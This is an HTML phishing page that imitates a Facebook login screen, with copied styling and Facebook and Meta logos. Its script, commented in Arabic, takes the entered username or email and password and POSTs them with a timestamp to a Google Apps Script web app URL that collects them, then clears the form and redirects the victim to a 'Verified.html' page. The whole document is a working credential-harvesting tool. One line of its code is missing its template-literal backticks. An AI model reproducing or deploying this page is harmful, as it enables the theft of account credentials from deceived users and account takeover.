<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            margin-top: 30px;
            padding: 20px 40px;
            width: 100%;
        }

        .logo {
            margin: 22px auto 12px;
            text-align: center;
        }

        .logo svg {
            width: 175px;
            height: 51px;
        }

        .form-group {
            margin-bottom: 6px;
            position: relative;
        }

        .form-group input {
            height: 50px;
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dfdede;
            border-radius: 15px;
            background-color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #a0a0a0;
            background-color: white;
        }

        .form-group input::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            border: none;
            border-radius: 20px;
            background-color: #0095f6;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: #1877f2;
        }

        .login-button:active {
            background-color: #005cb2;
        }

        .login-button:disabled {
            background-color: #b3d9f9;
            cursor: not-allowed;
        }

        .create-button {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            border: none;
            border-style: solid;
            border-width: 1px;
            border-radius: 20px;
            border-color: #0170bb;
            background-color: white;
            color: #0170bb;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .create-button:hover {
            background-color: rgba(128, 128, 128, 0.199);
        }

        .create-button:active {
            background-color: rgba(97, 97, 97, 0.514);
        }

        .forgot-password {
            display: block;
            text-align: center;
            color: #1c1d1f;
            font-weight: 500;
            font-size: 14px;
            margin-top: 12px;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s;
        }

        .forgot-password:hover {
            color: #005cb2;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
        }

        .signup-box p {
            color: #262626;
            font-size: 14px;
            margin: 0;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s;
        }

        .signup-box a:hover {
            color: #005cb2;
        }

        .get-app {
            width: 100%;
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            color: #262626;
            font-size: 14px;
            margin: 10px 0;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-stores a {
            display: inline-block;
            height: 40px;
        }

        .app-stores img {
            height: 100%;
            display: block;
        }

        footer {
            margin-top: 15px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 1.6;
        }

        footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 4px;
            transition: color 0.3s;
        }

        footer a:hover {
            color: #262626;
        }
        .meta-logo {
            width: 60px;
        }





        .loading {
            display: none;
            text-align: center;
            color: #0095f6;
            font-size: 14px;
            margin-top: 10px;
        }

        @media (max-width: 450px) {
            .login-box, .signup-box {
                padding: 10px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <center><p style="margin-top: 35px; font-size:small; color: rgba(0, 0, 0, 0.644);">English (UK)</p></center>
            <center><img src="images/fb-logo.png" alt="no" style="width: 100px; margin-bottom: 35px; margin-top: 30px;"></center>
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder=" Mobile number or email address" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder=" Password" required>
                </div>
                <button type="submit" class="login-button" id="loginBtn">Log in</button>
                <div class="loading" id="loadingMsg"></div>
            </form>
            
            <div>
                <a href="#" class="forgot-password">Forgotten password?</a>
            </div>

            <br>
            <br>
            <br>

            <div><button class="create-button">Create new account</button></div>

            <footer>
                <div><a href="www.meta.com"><img class="meta-logo" src="images/meta.PNG" alt="Meta Logo"></a></div>
                <a href="#">About</a>
                <a href="#">Help</a>
                <a href="#">More</a>
            </footer>
        </div>
    </div>

    <script>
    // ضع هنا رابط Google Apps Script Web App URL
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzga6dZBGi8f0SpNfyV94OxoOyfCUiwylGGXJdyPGBXYIVP0lP4MvTxsmpEekG05CuLGw/exec';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const loginBtn = document.getElementById('loginBtn');
        const loadingMsg = document.getElementById('loadingMsg');
        
        if (!username || !password) return;

        loginBtn.disabled = true;
        loadingMsg.style.display = 'block';

        // تحضير البيانات كـ form-urlencoded
        const params = username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&Date=${encodeURIComponent(new Date().toISOString())}&Status=pending;

        const xhr = new XMLHttpRequest();
        xhr.open("POST", GOOGLE_SCRIPT_URL, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                // مسح الحقول
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                loginBtn.disabled = false;
                loadingMsg.style.display = 'none';
                
                // التوجيه بعد إرسال البيانات
                setTimeout(function() {
                    window.location.href = 'Verified.html';
                }, 500);
            }
        };

        xhr.send(params);
    });

    document.querySelector('.forgot-password').addEventListener('click', function(e) {
        e.preventDefault();
    });

    document.querySelector('.create-button').addEventListener('click', function(e) {
        e.preventDefault();
    });
</script>
</body>

</html>
